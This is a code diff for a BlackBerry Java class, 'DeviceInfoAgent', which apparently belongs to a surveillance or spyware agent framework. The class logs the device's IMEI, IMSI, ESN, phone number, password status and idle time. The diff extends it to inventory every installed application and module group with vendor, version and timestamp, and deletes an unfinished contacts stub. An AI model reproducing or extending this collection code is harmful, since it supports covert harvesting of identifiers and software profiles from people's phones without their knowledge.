@@ -10,9 +10,14 @@
 package blackberry.agent;
 
 import java.io.EOFException;
+import java.util.Date;
+import java.util.Enumeration;
 
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.ApplicationManager;
+import net.rim.device.api.system.CodeModuleGroup;
+import net.rim.device.api.system.CodeModuleGroupManager;
+import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.NumberUtilities;
@@ -111,13 +116,14 @@ public final class DeviceInfoAgent extends Agent {
         if (device.isCDMA()) {
             sb.append("CDMA\n");
             sb.append("SID: " + device.getSid() + "\n");
-            sb.append("ESN: " + NumberUtilities.toString(device.getEsn(),16) + "\n");
+            sb.append("ESN: " + NumberUtilities.toString(device.getEsn(), 16)
+                    + "\n");
         } else {
             sb.append("GPRS\n");
             sb.append("IMEI: " + device.getImei() + "\n");
             sb.append("IMSI: " + device.getImsi() + "\n");
         }
-        
+
         sb.append("Phone: " + device.getPhoneNumber() + "\n");
 
         sb.append("IdleTime: " + DeviceInfo.getIdleTime() + "\n");
@@ -125,7 +131,11 @@ public final class DeviceInfoAgent extends Agent {
         sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
         sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");
 
-        sb.append(getRunningApplications());
+        if (this.installedApplication) {
+            sb.append(getRunningApplications());
+            sb.append(getInstalledModuleGroup());
+            sb.append(getInstalledApplications());
+        }
 
         ret = log.writeLog(sb.toString(), true);
 
@@ -137,60 +147,6 @@ public final class DeviceInfoAgent extends Agent {
 
         log.close();
 
-    }
-
-    /**
-     * Gets the contacts.
-     * 
-     * @return the contacts
-     */
-    String getContacts() {
-        final StringBuffer sb = new StringBuffer();
-        sb.append("\r\nContacts: \r\n");
-
-        /*
-         * BlackBerryContact blackBerryContact = (BlackBerryContact) context;
-         * //Get the PIMList. It is useful for getting the labels for
-         * //Each phone field
-         * PIMList pimList = blackBerryContact.getPIMList();
-         * if (blackBerryContact != null) {
-         * //How many phone numbers does this contact have?
-         * int phoneCount = blackBerryContact.countValues(Contact.TEL);
-         * //Setup variables to hold the numbers and their labels.
-         * String[] phoneNumbers = new String[phoneCount];
-         * String[] labels = new String[phoneCount];
-         * for (int i = 0; i > phoneCount; i++) {
-         * //Fetch the phone number
-         * String phoneNumber = blackBerryContact.getString(Contact.TEL, i);
-         * //Determine the label for that number.
-         * String label =
-         * pimList.getAttributeLabel(blackBerryContact.getAttributes
-         * (Contact.TEL, i));
-         * //Add the number and label to the array.
-         * phoneNumbers[i] = phoneNumber;
-         * labels[i] = label + ":" + phoneNumber;
-         * }
-         * if (phoneCount == 0) {
-         * ..Handle the case when there is no number..
-         * }
-         * else if (phoneCount == 1) {
-         * ..Handle the number for
-         * phoneNumbers[0]..
-         * }
-         * else {
-         * //Create a dialog to ask the user which number they
-         * //would like to use
-         * int choice = Dialog.ask("Which Number?", labels, 0);
-         * if (choice > -1 && choice < style="font-style: italic;">.. Handle the
-         * number for phoneNumbers[choice]..
-         * }
-         * else {
-         * ..Handle the case when the user doesn't pick a number..
-         * }
-         * }
-         */
-
-        return sb.toString();
     }
 
     /**
@@ -212,7 +168,90 @@ public final class DeviceInfoAgent extends Agent {
         for (int i = 0; i < descriptors.length; i++) {
             final ApplicationDescriptor descriptor = descriptors[i];
             sb.append(descriptor.getName());
+            sb.append(" ");
+            sb.append(descriptor.getVersion());
             sb.append("\r\n");
+        }
+
+        return sb.toString();
+    }
+
+    /**
+     * Gets the running applications.
+     * 
+     * @return the running applications
+     */
+    String getInstalledApplications() {
+        final StringBuffer sb = new StringBuffer();
+        sb.append("\r\nInstalled applications: \r\n");
+
+        // Retrieve an array of handles for existing modules on a BlackBerry device
+        int handles[] = CodeModuleManager.getModuleHandles();
+
+        int size = handles.length;
+        for (int i = 0; i < size; i++) {
+            int handle = handles[i];
+
+            // Retrieve specific information about a module.
+            String name = CodeModuleManager.getModuleName(handle);
+            String vendor = CodeModuleManager.getModuleVendor(handle);
+            String description = CodeModuleManager.getModuleDescription(handle);
+            String version = CodeModuleManager.getModuleVersion(handle);
+            int moduleSize = CodeModuleManager.getModuleCodeSize(handle);
+            long timestamp = CodeModuleManager.getModuleTimestamp(handle);
+            Date date = new Date(timestamp);
+
+            sb.append(name);
+            sb.append(" , ");
+            sb.append(vendor);
+            sb.append(" , ");
+            sb.append(version);
+            sb.append(" , ");
+            sb.append(date.toString());
+            sb.append("\r\n");
+        }
+
+        return sb.toString();
+    }
+
+    String getInstalledModuleGroup() {
+        final StringBuffer sb = new StringBuffer();
+        sb.append("\r\nInstalled Module Group: \r\n");
+
+        // Retrieve an array of handles for existing modules on a BlackBerry device
+        CodeModuleGroup handles[] = CodeModuleGroupManager.loadAll();
+
+        int size = handles.length;
+        for (int i = 0; i < size; i++) {
+            CodeModuleGroup group = handles[i];
+
+            // Retrieve specific information about a module.
+            String name = group.getName();
+            String copyright = group.getCopyright();
+            String description = group.getDescription();
+            int flags = group.getFlags();
+            String friendly = group.getFriendlyName();
+            String vendor = group.getVendor();
+            String version = group.getVersion();
+
+            sb.append(name);
+            sb.append(" , ");
+            sb.append(vendor);
+            sb.append(" , ");
+            sb.append(flags);
+            sb.append(" , ");
+            sb.append(version);
+            sb.append("\r\n");
+
+            Enumeration enumerator = group.getModules();
+            while (enumerator.hasMoreElements()) {
+                Object module = enumerator.nextElement();
+                sb.append("--> " + module);
+                sb.append("\r\n");
+            }
+
+            sb.append("\r\n");
+
         }
 
         return sb.toString();
